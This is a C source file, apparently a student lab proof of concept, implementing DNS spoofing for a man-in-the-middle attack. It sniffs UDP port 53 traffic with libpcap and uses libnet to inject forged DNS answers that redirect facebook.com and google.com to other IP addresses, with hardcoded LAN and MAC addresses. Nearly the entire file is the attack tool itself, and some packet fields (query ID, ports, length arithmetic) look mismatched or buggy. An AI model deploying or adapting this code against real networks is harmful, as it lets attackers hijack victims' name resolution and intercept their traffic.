/*
Lab5- Extra credit Program Question 7
Proof of Concept of Showing Man in the Middle Attack with DNS Spoofing

Author: Hitesh Parmar

run it like ./dnsSpoof eth0

*/

#include <stdio.h>
#include <libnet.h>
#include <pcap.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <resolv.h>





/* Method to Generate Fake DNS Response for Facebook.com DNS Query */

int fake_dns_fb()
{
	/* declarations */

	libnet_t *lnet;
	libnet_ptag_t UDPtag, IPtag, DNStag, packetTag, ethernetTag;
	u_long dst_ip, src_ip;
	u_int16_t qId;
	char errbuf[LIBNET_ERRBUF_SIZE];
	char payloadStr[255];
	u_int8_t payload[255];
	int payload_size=0, packet_size=0;
	DNStag = UDPtag = IPtag = LIBNET_PTAG_INITIALIZER;
	u_char enet_dst[6] = {0x00, 0x22, 0xfb, 0x47, 0xcc, 0x92};//00:22:fb:47:cc:92
	
	u_char enet_src[6] = {0x18, 0x1b, 0xeb, 0x3f, 0x9c, 0xf9};//18:1b:eb:3f:9c:f9

	lnet = libnet_init(LIBNET_LINK, NULL, errbuf);
	src_ip = libnet_name2addr4(lnet, "192.168.1.1", LIBNET_DONT_RESOLVE);
	dst_ip = libnet_name2addr4(lnet, "192.168.1.6", LIBNET_DONT_RESOLVE);
	if (lnet == NULL)
	{
		fprintf(stderr, "libnet_init() failure: %s", errbuf);
		exit(EXIT_FAILURE);
	}
	libnet_seed_prand(lnet);
	qId = (u_int16_t)libnet_get_prand(LIBNET_PR16);

	payload_size = sprintf(payloadStr, "%c%s%c%s%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",  
	/* DNS Question */
	0x08, "facebook", // domain name label, starts with its length
	0x03, "com", 0x00, //domain name label, starts with its length, ends with NULL
	0x00, 0x01, // TYPE (A) = 1
	0x00, 0x01, // CLASS (IN) = 1
	/* Answer */
	0xc0, 0x0c, // ref. to domain name
	0x00, 0x01, // TYPE (A) = 1
	0x00, 0x01, // CLASS (IN) = 1
	0x00, 0x00, 0x00, 0x3c, // Time to live - (1 min) 60 sec 
	0x00, 0x04, // data length
	0x4a, 0x7d, 0xe2, 0x46); // ANSWER (IP) google.com -> 74.125.226.72 => Yahoo.com 628BB718
			
	memcpy(payload, payloadStr, payload_size); 
			
	DNStag = libnet_build_dnsv4(LIBNET_UDP_DNSV4_H, 9999, 0x8000,1, 1, 0, 0, payload, payload_size, lnet, 0);
	if (DNStag == -1)
	{
		fprintf(stderr, "libnet_build_dnsv4() failure: %s",libnet_geterror(lnet));
		exit(EXIT_FAILURE);
	}

	packet_size = LIBNET_UDP_DNSV4_H+payload_size;

	UDPtag = libnet_build_udp(53, 6666, LIBNET_UDP_H+packet_size, 0, NULL, 0, lnet, 0);
	if (UDPtag == -1)
	{
		fprintf(stderr, "libnet_build_udp() failure: %s", libnet_geterror(lnet));
		exit(EXIT_FAILURE);
	}
	packet_size += LIBNET_UDP_H+packet_size;
	/* build IPv4 header*/

	IPtag = libnet_build_ipv4(LIBNET_IPV4_H+packet_size, 0, 242, 0, 64, IPPROTO_UDP, 0, src_ip, dst_ip, NULL, 0, lnet, 0);
	if (IPtag == -1)
	{
		fprintf(stderr, "libnet_build_ipv4() failure: %s", libnet_geterror(lnet));
		exit(EXIT_FAILURE);
	}
	packet_size += LIBNET_IPV4_H;

	// Ethernet header
	ethernetTag = libnet_build_ethernet( enet_dst, enet_src, ETHERTYPE_IP, NULL, 0, lnet, 0);
	if (ethernetTag == -1)
	{
		fprintf(stderr, "libnet_build_ethernet() failure: %s",libnet_geterror(lnet));
		exit(EXIT_FAILURE);
	}
	packetTag = libnet_write(lnet);
	if (packetTag == -1)
	{
		fprintf(stderr, "libnet_write() failure: %s", libnet_geterror(lnet));
		exit(EXIT_FAILURE);
	}
	return 0;
	
}
/* Method to Generate Fake DNS Response for Google.com DNS Query */
int fake_dns_google()
{
	

	libnet_t *lnet;
	libnet_ptag_t UDPtag, IPtag, DNStag, packetTag, ethernetTag;
	u_long dst_ip, src_ip;
	u_int16_t qId;
	char errbuf[LIBNET_ERRBUF_SIZE];
	char payloadStr[255];
	u_int8_t payload[255];
	int payload_size=0, packet_size=0;

	DNStag = UDPtag = IPtag = LIBNET_PTAG_INITIALIZER;
	u_char enet_dst[6] = {0x00, 0x22, 0xfb, 0x47, 0xcc, 0x92};//00:22:fb:47:cc:92
	u_char enet_src[6] = {0x18, 0x1b, 0xeb, 0x3f, 0x9c, 0xf9};//18:1b:eb:3f:9c:f9

	lnet = libnet_init(LIBNET_LINK, NULL, errbuf);
	src_ip = libnet_name2addr4(lnet, "192.168.1.1", LIBNET_DONT_RESOLVE);
	dst_ip = libnet_name2addr4(lnet, "192.168.1.6", LIBNET_DONT_RESOLVE);
		
	if (lnet == NULL)
	{
		fprintf(stderr, "libnet_init() failure: %s", errbuf);
		exit(EXIT_FAILURE);
	}
	libnet_seed_prand(lnet);
	qId = (u_int16_t)libnet_get_prand(LIBNET_PR16);
	payload_size = sprintf(payloadStr, "%c%s%c%s%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",  
	/* DNS Question */
	0x08, "google", 
	0x03, "com", 0x00, 
	0x00, 0x01, 
	0x00, 0x01, 
	/* Answer */
	0xc0, 0x0c, 
	0x00, 0x01, 
	0x00, 0x01, // CLASS (IN) = 1
	0x00, 0x00, 0x00, 0x3c, 
	0x00, 0x04, 
	0x32, 0x10, 0xcf, 0xc0);  //arbornetworks.com -> 50.16.207.192 
	memcpy(payload, payloadStr, payload_size); 
			
	DNStag = libnet_build_dnsv4(LIBNET_UDP_DNSV4_H, 9999, 0x8000,1, 1, 0, 0, payload, payload_size, lnet, 0);
	if (DNStag == -1)
	{
		fprintf(stderr, "libnet_build_dnsv4() failure: %s",libnet_geterror(lnet));
		exit(EXIT_FAILURE);
	}
	packet_size = LIBNET_UDP_DNSV4_H+payload_size;
	UDPtag = libnet_build_udp(53, 6666, LIBNET_UDP_H+packet_size, 0, NULL, 0, lnet, 0);
	if (UDPtag == -1)
	{
		fprintf(stderr, "libnet_build_udp() failure: %s", libnet_geterror(lnet));
			exit(EXIT_FAILURE);
	}
	packet_size += LIBNET_UDP_H+packet_size;
	
	IPtag = libnet_build_ipv4(LIBNET_IPV4_H+packet_size, 0, 242, 0, 64, IPPROTO_UDP, 0, src_ip, dst_ip, NULL, 0, lnet, 0);
	if (IPtag == -1)
	{
		fprintf(stderr, "libnet_build_ipv4() failure: %s", libnet_geterror(lnet));
		exit(EXIT_FAILURE);
	}
	
	packet_size += LIBNET_IPV4_H;

	// EtherNet Packet
	
	ethernetTag = libnet_build_ethernet( enet_dst, enet_src, ETHERTYPE_IP, NULL, 0, lnet, 0);
	if (ethernetTag == -1)
	{
		fprintf(stderr, "libnet_build_ethernet() failure: %s",libnet_geterror(lnet));
		exit(EXIT_FAILURE);
	}
	
	packetTag = libnet_write(lnet);
	if (packetTag == -1)
	{
		fprintf(stderr, "libnet_write() failure: %s", libnet_geterror(lnet));
		exit(EXIT_FAILURE);
	}
	return 0;
	
}

/* Review Traffic  

u_char *packet -- Packet to Review
int caplen -- Length of Packet
char* site_name -- domain name

return -- int 

*/

int review_traffic(const u_char *packet, int caplen,  char *site_name) {
	struct ip *ip;        
	struct udphdr *udp;   
	struct udphdr *dns;   
	char *data;           
	char *data_backup;    
	char name[128];       
	char name_ext[128];   
	u_long rdata;         
	int datalen;          
	int c = 1;                    
	int i = 0;
	libnet_t *handler;    
	int ETHER_HDRLEN=14;

	ip = (struct ip *) (packet + ETHER_HDRLEN);
	udp = (struct udphdr *) (packet + ETHER_HDRLEN + LIBNET_IPV4_H);
	dns = (struct udphdr *) (packet+ ETHER_HDRLEN + LIBNET_IPV4_H + LIBNET_UDP_H);

	
	data = (char *)(packet + ETHER_HDRLEN + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H);
	datalen = strlen(data);
	data_backup = data;
	memset(name, '\0', sizeof(name));
  
	
	if (dn_expand((u_char *)dns,packet + caplen,data,name,sizeof(name)) < 0){
		return 0;
	}
	printf("[DNS query for domain==>]%s\n", name);
 
	
	/* Check if Requested Site's packet is or not */
	if (strncmp(site_name, name, strlen(site_name)) != 0) {
		printf("Requested site is not in not in spoofing list %s\n\n", site_name);
		return 0;
	}

	return 1;
}

int main(int argc, char *argv[])
{
		pcap_t *handle;	
		//char iface[];
		char *iface;
		/* Session handle */
		printf("DNS Spoofing usage ./filename <interfacename> e.g. ./dnsspoof eth0 \n");
		//printf("Enter Interface Name\n");
		int len = strlen(argv[1]);
		iface = malloc(len+1);
		if(iface==NULL)
		{
		   printf("Interface Invalid or Memory Allocation Falied\n");
		   exit(1);
		}
		strcpy(iface, argv[1]);
		printf("%s\n",iface);
		//exit(0);
		//char iface[] = argv[0];	/* The Network Interface to sniff on e.g eth0 or wlan0 */
		
		char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
		struct bpf_program fp;		/* The compiled filter */
		char filter_exp[] = "udp dst port 53";	/* The filter expression */
		bpf_u_int32 mask;		/* Our netmask */
		bpf_u_int32 net;		/* Our IP */
		struct pcap_pkthdr header;	/* The header that pcap gives us */
		const u_char *packet;		/* The actual packet */

		
		
		/* Define the device */
		
		if (iface == NULL) {
			fprintf(stderr, "Please pass device in command line: %s\n", errbuf);
			return(2);
		}
		/* Find the properties for the device */
		if (pcap_lookupnet(iface, &net, &mask, errbuf) == -1) {
			fprintf(stderr, "Couldn't get netmask for device %s: %s\n", iface, errbuf);
			net = 0;
			mask = 0;
		}
		
		handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
		if (handle == NULL) {
			fprintf(stderr, "Couldn't open device %s: %s\n", iface, errbuf);
			return(2);
		}
		/* Compile and apply the filter */
		if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
			fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
			return(2);
		}
		if (pcap_setfilter(handle,&fp) == -1) {
			fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
			return(2);
		}
	//fake_dns();
	for(;;){
		/* Sniff a packet */
		packet = pcap_next(handle, &header);
		if (packet == NULL) continue; 
		//Fake Facebook
	  	if (((review_traffic(packet, header.len,"facebook.com")) == 1) || ((review_traffic(packet, header.len,"www.facebook.com")) == 1)) {
			printf("Request to Facebook.com DNS Request in Traffic\n");
			fake_dns_fb();
			//break;
		}
		//Fake Google
		if (((review_traffic(packet, header.len,"google.com")) == 1) || ((review_traffic(packet, header.len,"www.google.com")) == 1)) {
			printf("Request to Google.com DNS Request in Traffic\n");
			fake_dns_google();
			//break;
		}
		
		
	}

	pcap_close(handle);
	free(iface);
	return(0);
}



